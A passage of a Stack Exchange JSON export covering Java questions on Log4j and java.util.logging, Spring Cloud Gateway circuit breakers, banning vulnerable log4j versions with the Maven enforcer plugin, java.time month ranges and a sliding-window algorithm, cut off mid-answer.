noreferrer\">logging documentation</a>). You shouldn&#39;t add Log4j 1.x or Log4j 2.x Core to your classpath, unless you know what you are doing."}],"owner":{"account_id":13266324,"reputation":169,"user_id":12893352,"display_name":"Illidan"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":259,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1642493690,"creation_date":1642493690,"question_id":70752257,"body_markdown":"\r\nI have a dependency that logs in as follows : \r\n\r\n```java\r\nimport java.util.logging.Logger;\r\n\r\nprivate final Logger logger = Logger.getLogger(Logger.GLOBAL_LOGGER_NAME);\r\n```\r\n\r\nAnd an application that uses the dependency with the following pom : \r\n\r\n```json\r\n    &lt;parent&gt;\r\n\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\r\n\t\t&lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;\r\n\t\t&lt;version&gt;2.4.10&lt;/version&gt;\r\n\t&lt;/parent&gt;\r\n\r\n\t&lt;properties&gt;\r\n\t\t&lt;log4j2.version&gt;2.17.0&lt;/log4j2.version&gt;\r\n\t&lt;/properties&gt;\r\n```\r\nand the following implementation\r\n```java\r\nimport org.apache.logging.log4j.LogManager;\r\nimport org.apache.logging.log4j.Logger;\r\n\r\nprivate static final Logger logger = LogManager.getLogger(Example.class);\r\n```\r\nand with this configuration it only logs the main application, but if I add this to the pom ....\r\n```json\r\n\t\t&lt;dependency&gt;\r\n\t\t\t&lt;groupId&gt;log4j&lt;/groupId&gt;\r\n\t\t\t&lt;artifactId&gt;log4j&lt;/artifactId&gt;\r\n\t\t\t&lt;version&gt;1.2.16&lt;/version&gt;\r\n\t\t&lt;/dependency&gt;\r\n```\r\nWhat should I change in the code of the first dependency if I can&#39;t use spring to make this work without using log4j 1.2.16 ? What other solutions do I have?","title":"Log loss of a java.util.logging dependency","body":"<p>I have a dependency that logs in as follows :</p>\n<pre class=\"lang-java prettyprint-override\"><code>import java.util.logging.Logger;\n\nprivate final Logger logger = Logger.getLogger(Logger.GLOBAL_LOGGER_NAME);\n</code></pre>\n<p>And an application that uses the dependency with the following pom :</p>\n<pre class=\"lang-json prettyprint-override\"><code>    &lt;parent&gt;\n        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;\n        &lt;version&gt;2.4.10&lt;/version&gt;\n    &lt;/parent&gt;\n\n    &lt;properties&gt;\n        &lt;log4j2.version&gt;2.17.0&lt;/log4j2.version&gt;\n    &lt;/properties&gt;\n</code></pre>\n<p>and the following implementation</p>\n<pre class=\"lang-java prettyprint-override\"><code>import org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\n\nprivate static final Logger logger = LogManager.getLogger(Example.class);\n</code></pre>\n<p>and with this configuration it only logs the main application, but if I add this to the pom ....</p>\n<pre class=\"lang-json prettyprint-override\"><code>        &lt;dependency&gt;\n            &lt;groupId&gt;log4j&lt;/groupId&gt;\n            &lt;artifactId&gt;log4j&lt;/artifactId&gt;\n            &lt;version&gt;1.2.16&lt;/version&gt;\n        &lt;/dependency&gt;\n</code></pre>\n<p>What should I change in the code of the first dependency if I can't use spring to make this work without using log4j 1.2.16 ? What other solutions do I have?</p>\n"},{"tags":["java","spring-cloud-gateway","resilience4j"],"owner":{"account_id":23965211,"reputation":11,"user_id":17954807,"display_name":"docklet"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":224,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":0,"score":1,"last_activity_date":1642493525,"creation_date":1642421018,"question_id":70741048,"body_markdown":"I am trying to add resillience4j to my spring cloud gw project.And I am using settings below to record some specific http codes as exception which is works well. But there is some minor tricky situation.\r\n\r\nThis is my filter added to my route. When 409 status code comes as response from the route my circuit recording and counting it.\r\n\r\n              filters:\r\n                - name: CircuitBreaker\r\n                  args:\r\n                    name: myCircuitBreaker\r\n                    statusCodes:\r\n                      - 409\r\n\r\nBut at the client side of the gateway project I am getting 500 Internal Server Error. And when i checked the logs of gateway project i can see that actual error code.\r\n\r\n&gt; recorded an error: &#39;org.springframework.cloud.gateway.filter.factory.SpringCloudCircuitBreakerFilterFactory$CircuitBreakerStatusCodeException: \r\n**409 CONFLICT&#39;. Elapsed time: 131 ms**\r\n2022-01-17T11:55:53.191782442Z 2022-01-17 14:55:53.190 ERROR 7 --- [or-http-epoll-2] a.w.r.e.AbstractErrorWebExceptionHandler : \r\n[54b3d2d3-2]  **500 Server Error for HTTP PUT** &quot;/bookservice/api/v1/users/741180f5-a32d-40c3-830e-05fc701c1b07&quot;\r\n2022-01-17T11:55:53.191812771Z \r\n2022-01-17T11:55:53.191815233Z org.springframework.cloud.gateway.filter.factory.SpringCloudCircuitBreakerFilterFactory$CircuitBreakerStatusCodeException: **409 CONFLICT**\r\n2022-01-17T11:55:53.191817141Z \tat org.springframework.cloud.gateway.filter.factory.SpringCloudCircuitBreakerFilterFactory$1.lambda$filter$0(SpringCloudCircuitBreakerFilterFactory.java:101) ~[spring-cloud-gateway-server-3.0.4.jar!/:3.0.4]\r\n2022-01-17T11:55:53.191819403Z \tSuppressed: reactor.core.publisher.FluxOnAssembly$OnAssemblyException: \r\n2022-01-17T11:55:53.191821132Z Error has been observed at the following site(s):\r\n2022-01-17T11:55:53.191822829Z \t|_ checkpoint ⇢ org.springframework.cloud.gateway.filter.WeightCalculatorWebFilter [DefaultWebFilterChain]\r\n2022-01-17T11:55:53.191825077Z \t|_ checkpoint ⇢ org.springframework.boot.actuate.metrics.web.reactive.server.MetricsWebFilter [DefaultWebFilterChain]\r\n2022-01-17T11:55:53.191826936Z \t|_ checkpoint ⇢ HTTP PUT &quot;/bookservice/api/v1/users/741180f5-a32d-40c3-830e-05fc701c1b07&quot; [ExceptionHandlingWebHandler]\r\n\r\n\r\nHow to change this behaviour ? Thanks in advance.\r\n\r\n","title":"Spring Cloud GW -Resilience4j overrides http message","body":"<p>I am trying to add resillience4j to my spring cloud gw project.And I am using settings below to record some specific http codes as exception which is works well. But there is some minor tricky situation.</p>\n<p>This is my filter added to my route. When 409 status code comes as response from the route my circuit recording and counting it.</p>\n<pre><code>          filters:\n            - name: CircuitBreaker\n              args:\n                name: myCircuitBreaker\n                statusCodes:\n                  - 409\n</code></pre>\n<p>But at the client side of the gateway project I am getting 500 Internal Server Error. And when i checked the logs of gateway project i can see that actual error code.</p>\n<blockquote>\n<p>recorded an error: 'org.springframework.cloud.gateway.filter.factory.SpringCloudCircuitBreakerFilterFactory$CircuitBreakerStatusCodeException:\n<strong>409 CONFLICT'. Elapsed time: 131 ms</strong>\n2022-01-17T11:55:53.191782442Z 2022-01-17 14:55:53.190 ERROR 7 --- [or-http-epoll-2] a.w.r.e.AbstractErrorWebExceptionHandler :\n[54b3d2d3-2]  <strong>500 Server Error for HTTP PUT</strong> &quot;/bookservice/api/v1/users/741180f5-a32d-40c3-830e-05fc701c1b07&quot;\n2022-01-17T11:55:53.191812771Z\n2022-01-17T11:55:53.191815233Z org.springframework.cloud.gateway.filter.factory.SpringCloudCircuitBreakerFilterFactory$CircuitBreakerStatusCodeException: <strong>409 CONFLICT</strong>\n2022-01-17T11:55:53.191817141Z  at org.springframework.cloud.gateway.filter.factory.SpringCloudCircuitBreakerFilterFactory$1.lambda$filter$0(SpringCloudCircuitBreakerFilterFactory.java:101) ~[spring-cloud-gateway-server-3.0.4.jar!/:3.0.4]\n2022-01-17T11:55:53.191819403Z  Suppressed: reactor.core.publisher.FluxOnAssembly$OnAssemblyException:\n2022-01-17T11:55:53.191821132Z Error has been observed at the following site(s):\n2022-01-17T11:55:53.191822829Z  |_ checkpoint ⇢ org.springframework.cloud.gateway.filter.WeightCalculatorWebFilter [DefaultWebFilterChain]\n2022-01-17T11:55:53.191825077Z  |_ checkpoint ⇢ org.springframework.boot.actuate.metrics.web.reactive.server.MetricsWebFilter [DefaultWebFilterChain]\n2022-01-17T11:55:53.191826936Z  |_ checkpoint ⇢ HTTP PUT &quot;/bookservice/api/v1/users/741180f5-a32d-40c3-830e-05fc701c1b07&quot; [ExceptionHandlingWebHandler]</p>\n</blockquote>\n<p>How to change this behaviour ? Thanks in advance.</p>\n"},{"tags":["java","eclipse","maven","pom.xml","war"],"comments":[{"owner":{"account_id":22565,"reputation":11004,"user_id":55794,"accept_rate":54,"display_name":"emeraldjava"},"score":3,"creation_date":1642417493,"post_id":70740248,"comment_id":125056906,"body_markdown":"See the maven dependency exclusion block as documented here. https://maven.apache.org/guides/introduction/introduction-to-optional-and-excludes-dependencies.html","body":"See the maven dependency exclusion block as documented here. <a href=\"https://maven.apache.org/guides/introduction/introduction-to-optional-and-excludes-dependencies.html\" rel=\"nofollow noreferrer\">maven.apache.org/guides/introduction/&hellip;</a>"},{"owner":{"account_id":4196075,"reputation":17303,"user_id":3437460,"accept_rate":49,"display_name":"user3437460"},"score":0,"creation_date":1642417786,"post_id":70740248,"comment_id":125057000,"body_markdown":"I have thought about using exclusion, but with that I need to explicitly mention all the artifacts and exclude then one by one? Are there any ways we can exclude a specific dependency without mentioning all the artifacts? Or explicit exclusion on each artifact is the only way to do it?","body":"I have thought about using exclusion, but with that I need to explicitly mention all the artifacts and exclude then one by one? Are there any ways we can exclude a specific dependency without mentioning all the artifacts? Or explicit exclusion on each artifact is the only way to do it?"},{"owner":{"account_id":112317,"reputation":93939,"user_id":296328,"accept_rate":60,"display_name":"khmarbaise"},"score":7,"creation_date":1642418694,"post_id":70740248,"comment_id":125057348,"body_markdown":"I would suggest to use maven-enforcer-plugin to prevent any use of particular libs/versions https://maven.apache.org/enforcer/enforcer-rules/bannedDependencies.html or https://maven.apache.org/enforcer/enforcer-rules/banTransitiveDependencies.html","body":"I would suggest to use maven-enforcer-plugin to prevent any use of particular libs/versions <a href=\"https://maven.apache.org/enforcer/enforcer-rules/bannedDependencies.html\" rel=\"nofollow noreferrer\">maven.apache.org/enforcer/enforcer-rules/&hellip;</a> or <a href=\"https://maven.apache.org/enforcer/enforcer-rules/banTransitiveDependencies.html\" rel=\"nofollow noreferrer\">maven.apache.org/enforcer/enforcer-rules/&hellip;</a>"}],"answers":[{"tags":[],"owner":{"account_id":216698,"reputation":26495,"user_id":472109,"accept_rate":85,"display_name":"Geoffrey De Smet"},"down_vote_count":0,"up_vote_count":5,"is_accepted":false,"score":5,"last_activity_date":1642492958,"creation_date":1642492958,"answer_id":70752105,"question_id":70740248,"body_markdown":"Use the enforcer plugin to ban all unsecure log4j versions. Any use will fail your build and tell you where it&#39;s being used, allowing you to overwrite the log4j dependency with a secure version or exclude it altogether.\r\n\r\nFrom Gunnar Morling&#39;s gist (warning: update the log4j minimum version here [to the log4j version with no vulnerabilities reported][1]):\r\n\r\n    &lt;!-- plug-in configuration to put into your parent POM for avoiding any usages of\r\n         outdated log4j2 versions, some of which are subject to the RCE CVE-2021-44228\r\n         (&quot;Log4Shell&quot;), CVE-2021-45046, and CVE-2021-45105. Make sure to check for the\r\n         latest version of log4j2 at\r\n         https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;\r\n    ...\r\n    &lt;plugin&gt;\r\n      &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\r\n      &lt;artifactId&gt;maven-enforcer-plugin&lt;/artifactId&gt;\r\n      &lt;version&gt;3.0.0&lt;/version&gt;\r\n      &lt;executions&gt;\r\n        &lt;execution&gt;\r\n          &lt;id&gt;ban-bad-log4j-versions&lt;/id&gt;\r\n          &lt;phase&gt;validate&lt;/phase&gt;\r\n          &lt;goals&gt;\r\n            &lt;goal&gt;enforce&lt;/goal&gt;\r\n          &lt;/goals&gt;\r\n          &lt;configuration&gt;\r\n            &lt;rules&gt;\r\n              &lt;bannedDependencies&gt;\r\n                &lt;excludes&gt;\r\n                  &lt;exclude&gt;org.apache.logging.log4j:log4j-core:(,2.17.0)&lt;/exclude&gt;\r\n                &lt;/excludes&gt;\r\n              &lt;/bannedDependencies&gt;\r\n            &lt;/rules&gt;\r\n            &lt;fail&gt;true&lt;/fail&gt;\r\n          &lt;/configuration&gt;\r\n        &lt;/execution&gt;\r\n      &lt;/executions&gt;\r\n    &lt;/plugin&gt;\r\n\r\n\r\n  [1]: https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core","title":"How to prevent Maven project from downloading specific dependencies?","body":"<p>Use the enforcer plugin to ban all unsecure log4j versions. Any use will fail your build and tell you where it's being used, allowing you to overwrite the log4j dependency with a secure version or exclude it altogether.</p>\n<p>From Gunnar Morling's gist (warning: update the log4j minimum version here <a href=\"https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core\" rel=\"noreferrer\">to the log4j version with no vulnerabilities reported</a>):</p>\n<pre><code>&lt;!-- plug-in configuration to put into your parent POM for avoiding any usages of\n     outdated log4j2 versions, some of which are subject to the RCE CVE-2021-44228\n     (&quot;Log4Shell&quot;), CVE-2021-45046, and CVE-2021-45105. Make sure to check for the\n     latest version of log4j2 at\n     https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;\n...\n&lt;plugin&gt;\n  &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\n  &lt;artifactId&gt;maven-enforcer-plugin&lt;/artifactId&gt;\n  &lt;version&gt;3.0.0&lt;/version&gt;\n  &lt;executions&gt;\n    &lt;execution&gt;\n      &lt;id&gt;ban-bad-log4j-versions&lt;/id&gt;\n      &lt;phase&gt;validate&lt;/phase&gt;\n      &lt;goals&gt;\n        &lt;goal&gt;enforce&lt;/goal&gt;\n      &lt;/goals&gt;\n      &lt;configuration&gt;\n        &lt;rules&gt;\n          &lt;bannedDependencies&gt;\n            &lt;excludes&gt;\n              &lt;exclude&gt;org.apache.logging.log4j:log4j-core:(,2.17.0)&lt;/exclude&gt;\n            &lt;/excludes&gt;\n          &lt;/bannedDependencies&gt;\n        &lt;/rules&gt;\n        &lt;fail&gt;true&lt;/fail&gt;\n      &lt;/configuration&gt;\n    &lt;/execution&gt;\n  &lt;/executions&gt;\n&lt;/plugin&gt;\n</code></pre>\n"}],"owner":{"account_id":4196075,"reputation":17303,"user_id":3437460,"accept_rate":49,"display_name":"user3437460"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1887,"favorite_count":0,"down_vote_count":0,"up_vote_count":3,"answer_count":1,"score":3,"last_activity_date":1642492958,"creation_date":1642417293,"question_id":70740248,"body_markdown":"I wanted to remove all direct / transitive dependencies using older log4J version, particularly version `1.27.1` from my project.\r\n\r\nI have made sure that my project&#39;s `pom.xml` and `lib` folder does not contain `log4J 1.27.1`. \r\n\r\nHowever, whenever the project builds into a `.war` file, there are some other libraries in my project which is still using `log4j 1.27.1` resulting in `log4j-1.27.1.jar` being downloaded into the build for deployment.\r\n\r\nIs there any means we can force the Maven project by preventing it from downloading a specific dependency? For example, by adding some \r\nconfigurations to the `pom.xml` file?\r\n\r\n-------\r\n**Edit 1**: Understand that one way to do it is to do exclusions in the `pom.xml` file. But that requires me to explicitly mention all the artifacts . Is there anyway to do it as though I am stating `&quot;hey, I don&#39;t want to see log4j-1.27.1.jar downloaded in my Maven project at all, be it any artifact is depending on it&quot;` ?","title":"How to prevent Maven project from downloading specific dependencies?","body":"<p>I wanted to remove all direct / transitive dependencies using older log4J version, particularly version <code>1.27.1</code> from my project.</p>\n<p>I have made sure that my project's <code>pom.xml</code> and <code>lib</code> folder does not contain <code>log4J 1.27.1</code>.</p>\n<p>However, whenever the project builds into a <code>.war</code> file, there are some other libraries in my project which is still using <code>log4j 1.27.1</code> resulting in <code>log4j-1.27.1.jar</code> being downloaded into the build for deployment.</p>\n<p>Is there any means we can force the Maven project by preventing it from downloading a specific dependency? For example, by adding some\nconfigurations to the <code>pom.xml</code> file?</p>\n<hr />\n<p><strong>Edit 1</strong>: Understand that one way to do it is to do exclusions in the <code>pom.xml</code> file. But that requires me to explicitly mention all the artifacts . Is there anyway to do it as though I am stating <code>&quot;hey, I don't want to see log4j-1.27.1.jar downloaded in my Maven project at all, be it any artifact is depending on it&quot;</code> ?</p>\n"},{"tags":["java","android","kotlin","android-jodatime"],"answers":[{"tags":[],"owner":{"account_id":322981,"reputation":310745,"user_id":642706,"accept_rate":58,"display_name":"Basil Bourque"},"down_vote_count":0,"up_vote_count":2,"is_accepted":true,"score":2,"last_activity_date":1642492882,"creation_date":1642491098,"answer_id":70751746,"question_id":70751573,"body_markdown":"# tl;dr\r\n\r\nUsing *java.time*, the successor to [Joda-Time][1].\r\n\r\n    yearMonth               // An instance of `java.time.YearMonth`.\r\n    .atDay( 1 )             // Returns a `LocalDate` object for the first of the month.\r\n    .datesUntil(            // Get a range of dates.\r\n        yearMonth\r\n        .plusMonths( 1 )    // Move to the following month.\r\n        .atDay( 1 )         // Get the first day of that following month, a `LocalDate` object.\r\n    )                       // Returns a stream of `LocalDate` objects.\r\n    .toList()               // Collects the streamed objects into a list. \r\n\r\nFor older versions of Java without a `Stream#toList` method, use `collect( Collectors.toList() )`.\r\n\r\n\r\n# *java.time*\r\n\r\nThe *Joda-Time* project is now in maintenance mode. The project recommends moving to its successor, the *java.time* classes defined in JSR 310 and built into Java 8 and later. Android 26+ has an implementation. For earlier Android, the latest Gradle tooling makes most of the *java.time* functionality available via &#171;&#160;API desugaring&#160;&#187;. \r\n\r\n# `YearMonth`\r\n\r\nSpecify a month.\r\n\r\n    YearMonth ym = YearMonth.now() ;\r\n\r\nInterrogate for its length. \r\n\r\n    int lengthOfMonth = ym.lengthOfMonth() ;\r\n\r\n\r\n# `LocalDate`\r\n\r\nTo get a list of dates, get the first date of the month.\r\n\r\n    LocalDate start = ym.atDay( 1 ) ;\r\n\r\nAnd the first day of the *next* month. \r\n\r\n    LocalDate end = ym.plusMonths( 1 ).atDay( 1 ) ;\r\n\r\nGet a stream of dates in between. Collect into a list.\r\n\r\n    List&lt; LocalDate &gt; dates = start.datesUntil( end ).toList() ;\r\n\r\n\r\n  [1]: http://lengthOfMonth","title":"How can I get the list of days of each month in the &quot;JODA&quot; library?","body":"<h1>tl;dr</h1>\n<p>Using <em>java.time</em>, the successor to <a href=\"http://lengthOfMonth\" rel=\"nofollow noreferrer\">Joda-Time</a>.</p>\n<pre><code>yearMonth               // An instance of `java.time.YearMonth`.\n.atDay( 1 )             // Returns a `LocalDate` object for the first of the month.\n.datesUntil(            // Get a range of dates.\n    yearMonth\n    .plusMonths( 1 )    // Move to the following month.\n    .atDay( 1 )         // Get the first day of that following month, a `LocalDate` object.\n)                       // Returns a stream of `LocalDate` objects.\n.toList()               // Collects the streamed objects into a list. \n</code></pre>\n<p>For older versions of Java without a <code>Stream#toList</code> method, use <code>collect( Collectors.toList() )</code>.</p>\n<h1><em>java.time</em></h1>\n<p>The <em>Joda-Time</em> project is now in maintenance mode. The project recommends moving to its successor, the <em>java.time</em> classes defined in JSR 310 and built into Java 8 and later. Android 26+ has an implementation. For earlier Android, the latest Gradle tooling makes most of the <em>java.time</em> functionality available via « API desugaring ».</p>\n<h1><code>YearMonth</code></h1>\n<p>Specify a month.</p>\n<pre><code>YearMonth ym = YearMonth.now() ;\n</code></pre>\n<p>Interrogate for its length.</p>\n<pre><code>int lengthOfMonth = ym.lengthOfMonth() ;\n</code></pre>\n<h1><code>LocalDate</code></h1>\n<p>To get a list of dates, get the first date of the month.</p>\n<pre><code>LocalDate start = ym.atDay( 1 ) ;\n</code></pre>\n<p>And the first day of the <em>next</em> month.</p>\n<pre><code>LocalDate end = ym.plusMonths( 1 ).atDay( 1 ) ;\n</code></pre>\n<p>Get a stream of dates in between. Collect into a list.</p>\n<pre><code>List&lt; LocalDate &gt; dates = start.datesUntil( end ).toList() ;\n</code></pre>\n"}],"owner":{"account_id":14727275,"reputation":941,"user_id":10635762,"display_name":"Saeed Noshadi"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":512,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"accepted_answer_id":70751746,"answer_count":1,"score":1,"last_activity_date":1642492882,"creation_date":1642490100,"question_id":70751573,"body_markdown":"I need to get a list of days each month in the JODA library. how can I do that?","title":"How can I get the list of days of each month in the &quot;JODA&quot; library?","body":"<p>I need to get a list of days each month in the JODA library. how can I do that?</p>\n"},{"tags":["java","sliding-window"],"comments":[{"owner":{"account_id":1328773,"reputation":37883,"user_id":1273080,"accept_rate":100,"display_name":"Petr Janeček"},"score":0,"creation_date":1602961002,"post_id":64406006,"comment_id":113887224,"body_markdown":"You only have a single loop. Imagine a window of 4, and trace how your program would go over two consecutive windows. It wouldn&#39;t, your logic is flawed, and the failure you see is an artifact of this. When you slide the window, where do you check the beginning of the windows again? You need two nested loops.","body":"You only have a single loop. Imagine a window of 4, and trace how your program would go over two consecutive windows. It wouldn&#39;t, your logic is flawed, and the failure you see is an artifact of this. When you slide the window, where do you check the beginning of the windows again? You need two nested loops."},{"owner":{"account_id":12488260,"reputation":9978,"user_id":9090751,"display_name":"Mafor"},"score":1,"creation_date":1602970544,"post_id":64406006,"comment_id":113889703,"body_markdown":"@PetrJaneček Not true, one loop is enough. See my answer below.","body":"@PetrJaneček Not true, one loop is enough. See my answer below."}],"answers":[{"tags":[],"owner":{"account_id":10346755,"reputation":21971,"user_id":7631480,"display_name":"CryptoFool"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1602961370,"creation_date":1602960846,"answer_id":64406181,"question_id":64406006,"body_markdown":"I tried to understand your logic, but I couldn&#39;t quite get it.  Here&#39;s what I came up with, starting pretty much from scratch:\r\n\r\n    class demo2 {\r\n    \r\n        public static void maximum (int arr[], int k){\r\n            for (int j = 0; j &lt; arr.length - k + 1; j++) {\r\n                boolean found = false;\r\n                for (int x = j; x &lt; j + k; x++) {\r\n                    if (arr[x] &lt; 0) {\r\n                        System.out.println(arr[x]);\r\n                        found = true;\r\n                        break;\r\n                    }\r\n                }\r\n                if (!found)\r\n                    System.out.println(0);\r\n            }\r\n        }\r\n    \r\n        public static void main(String[] args) {\r\n            int arr[] = { -2, 5, 1, 8, -2, 9, -1 };\r\n            int k = 2;\r\n            maximum(arr, k);\r\n        }\r\n    }\r\n\r\nResult:\r\n\r\n    -2\r\n    0\r\n    0\r\n    -2\r\n    -2\r\n    -1\r\n\r\nI recognize that there might be a more efficient way of doing this to the point that it would matter, if both the array length and the window size were significantly large.  But your question doesn&#39;t state that this is the case. This is a place where you need to be sure you want to spend the time to optimize beyond the simple and obvious solution.","title":"First negative integer in every window of size k with auxiliary space O(1) and O(n) time complexity","body":"<p>I tried to understand your logic, but I couldn't quite get it.  Here's what I came up with, starting pretty much from scratch:</p>\n<pre><code>class demo2 {\n\n    public static void maximum (int arr[], int k){\n        for (int j = 0; j &lt; arr.length - k + 1; j++) {\n            boolean found = false;\n            for (int x = j; x &lt; j + k; x++) {\n                if (arr[x] &lt; 0) {\n                    System.out.println(arr[x]);\n                    found = true;\n                    break;\n                }\n            }\n            if (!found)\n                System.out.println(0);\n        }\n    }\n\n    public static void main(String[] args) {\n        int arr[] = { -2, 5, 1, 8, -2, 9, -1 };\n        int k = 2;\n        maximum(arr, k);\n    }\n}\n</code></pre>\n<p>Result:</p>\n<pre><code>-2\n0\n0\n-2\n-2\n-1\n</code></pre>\n<p>I recognize that there might be a more efficient way of doing this to the point that it would matter, if both the array length and the window size were significantly large.  But your question doesn't state that this is the case. This is a place where you need to be sure you want to spend the time to optimize beyond the simple and obvious solution.</p>\n"},{"tags":[],"owner":{"account_id":12488260,"reputation":9978,"user_id":9090751,"display_name":"Mafor"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1603042497,"creation_date":1602969706,"answer_id":64407468,"question_id":64406006,"body_markdown":"It can be implemented with real linear complexity **O(n)** (as opposite to the naive implementation with &lt;s&gt;polynomial&lt;/s&gt; complexity **O(n*k)**):\r\n```java\r\npublic static void maximum (int arr[], int k) {\r\n    int index = -1;\r\n    for (int i = arr.length - 1; i &gt;= 0; i--) {\r\n        if (index &gt;= i + k) {\r\n            index = -1;\r\n        }\r\n        if (arr[i] &lt; 0) {\r\n            index = i;\r\n        }\r\n        arr[i] = index &gt;= 0 ? arr[index] : 0;\r\n    }\r\n    for(int i = 0; i &lt;= arr.length - k; i++) {\r\n        System.out.println(arr[i]);\r\n    }\r\n}\r\n```\r\n**UPDATE:** or even better, without writing to the `arr` array:\r\n```java\r\npublic static void maximum (int arr[], int k) {\r\n    int index = -1;\r\n    for (int i = 0; i &lt; arr.length - k + 1; i++) {\r\n        if(index &lt; i) {\r\n            // Find the index of the next negative number\r\n            do {\r\n                index++;\r\n            } while (index &lt; arr.length &amp;&amp; arr[index] &gt;= 0);\r\n        }\r\n        // If the next negative number is within the window print it,\r\n        // otherwise print &quot;0&quot;\r\n        System.out.println(index &lt; i + k ? arr[index] : 0);\r\n    }\r\n}\r\n```\r\nComparison with the naive algorithm O(n*k) in terms of the number of iterations of the (internal) loop (worst case scenario, i.e. when there are no negative numbers in the table at all):\r\n```\r\n            | naive        | dynamic |\r\n            | O((n-m+1)*m) | O(n)    |\r\n--------------------------------------\r\n  n=7,  m=2 |           12 |       7 |\r\n n=10,  m=2 |           18 |      10 |\r\nn=100, m=10 |          910 |     100 |\r\nn=100, m=50 |         2550 |     100 |     \r\n```","title":"First negative integer in every window of size k with auxiliary space O(1) and O(n) time complexity","body":"<p>It can be implemented with real linear complexity <strong>O(n)</strong> (as opposite to the naive implementation with <s>polynomial</s> complexity <strong>O(n*k)</strong>):</p>\n<pre class=\"lang-java prettyprint-override\"><code>public static void maximum (int arr[], int k) {\n    int index = -1;\n    for (int i = arr.length - 1; i &gt;= 0; i--) {\n        if (index &gt;= i + k) {\n            index = -1;\n        }\n        if (arr[i] &lt; 0) {\n            index = i;\n        }\n        arr[i] = index &gt;= 0 ? arr[index] : 0;\n    }\n    for(int i = 0; i &lt;= arr.length - k; i++) {\n        System.out.println(arr[i]);\n    }\n}\n</code></pre>\n<p><strong>UPDATE:</strong> or even better, without writing to the <code>arr</code> array:</p>\n<pre class=\"lang-java prettyprint-override\"><code>public static void maximum (int arr[], int k) {\n    int index = -1;\n    for (int i = 0; i &lt; arr.length - k + 1; i++) {\n        if(index &lt; i) {\n            // Find the index of the next negative number\n            do {\n                index++;\n            } while (index &lt; arr.length &amp;&amp; arr[index] &gt;= 0);\n        }\n        // If the next negative number is within the window print it,\n        // otherwise print &quot;0&quot;\n        System.out.println(index &lt; i + k ? arr[index] : 0);\n    }\n}\n</code></pre>\n<p>Comparison with the naive algorithm O(n*k) in terms of the number of iterations of the (internal) loop (worst case scenario, i.e. when there are no negative numbers in the table at all):</p>\n<pre><code>            | naive        | dynamic |\n            | O((n-m+1)*m) | O(n)    |\n--------------------------------------\n  n=7,  m=2 |           12 |       7 |\n n=10,  m=2 |           18 |      10 |\nn=100, m=10 |          910 |     100 |\nn=100, m=50 |         2550 |     100 |     \n</code></pre>\n"},{"tags":[],"owner":{"account_id":18980577,"reputation":31,"user_id":13852041,"display_name":"Dipesh Kurasau"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1626173996,"creation_date":1626173996,"answer_id":68361153,"question_id":64406006,"body_markdown":"I have a c++ solution, also i have submitted this code on gfgs practice problem and it got accepted. Time complexity is O(n) and auxiliary space complexity is O(K)\r\n```\r\nvector&lt;int&gt; firstNegative(vector&lt;int&gt; arr, int lenn, int k)\r\n{\r\n  vector &lt;int&gt; ans;\r\n  int start = 0, end = 0;\r\n  queue &lt;int&gt; index;\r\n  while(start &lt;= lenn-k)\r\n  {\r\n    if(arr[end] &lt; 0)\r\n      index.push(end);\r\n\r\n      \r\n    if(k == (end-start+1))\r\n    {\r\n      if(index.empty())\r\n        ans.push_back(0);\r\n      else\r\n      {\r\n        if(index.front()&gt;=start &amp;&amp; index.front()&lt;=end)\r\n          ans.push_back(arr[index.front()]);\r\n        else\r\n        {\r\n          index.pop();\r\n          continue;\r\n        }\r\n      }\r\n      start++;\r\n    }\r\n    end++;\r\n  }\r\n  return ans;\r\n}\r\n``` ","title":"First negative integer in every window of size k with auxiliary space O(1) and O(n) time complexity","body":"<p>I have a c++ solution, also i have submitted this code on gfgs practice problem and it got accepted. Time complexity is O(n) and auxiliary space complexity is O(K)</p>\n<pre><code>vector&lt;int&gt; firstNegative(vector&lt;int&gt; arr, int lenn, int k)\n{\n  vector &lt;int&gt; ans;\n  int start = 0, end = 0;\n  queue &lt;int&gt; index;\n  while(start &lt;= lenn-k)\n  {\n    if(arr[end] &lt; 0)\n      index.push(end);\n\n      \n    if(k == (end-start+1))\n    {\n      if(index.empty())\n        ans.push_back(0);\n      else\n      {\n        if(index.front()&gt;=start &amp;&amp; index.front()&lt;=end)\n          ans.push_back(arr[index.front()]);\n        else\n        {\n          index.pop();\n          continue;\n        }\n      }\n      start++;\n    }\n    end++;\n  }\n  return ans;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":22261553,"reputation":1,"user_id":16492923,"display_name":"Amit Kumar"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1626847218,"creation_date":1626847218,"answer_id":68464647,"question_id":64406006,"body_markdown":"         Deque&lt;Long&gt; queue = new LinkedList&lt;&gt;();\r\n         int C=N-K+1;\r\n    \t\tlong[] output = new long[C];\r\n    \t\tint c = -1;\r\n    \t\tint startWindow = 0;\r\n    \t\tint endWindow =K;\r\n    \t\tboolean firstFlag=true;\r\n    \t\twhile (true) {\r\n    \t\t    for(int 